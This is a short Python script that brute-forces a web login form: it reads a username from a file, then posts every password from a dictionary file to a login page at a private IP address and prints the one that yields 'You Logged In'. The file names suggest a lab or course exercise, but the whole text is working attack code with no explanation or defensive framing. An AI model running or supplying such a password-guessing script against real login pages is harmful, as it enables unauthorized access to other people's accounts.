import requests
import json
with open("Q1", "r") as file:
    username = file.read()
url = "http://172.16.48.80:80/"
payload = {"username": username, "password": "123123", "submit": "Sign In"}
with open("Q2dictionary.txt", "r") as file:
    passwords = file.read().splitlines() 
for password in passwords:
    payload["password"] = password
    x = requests.post(url, data = payload)
    if x.text.find("You Logged In") != -1:
        print("password: " + password)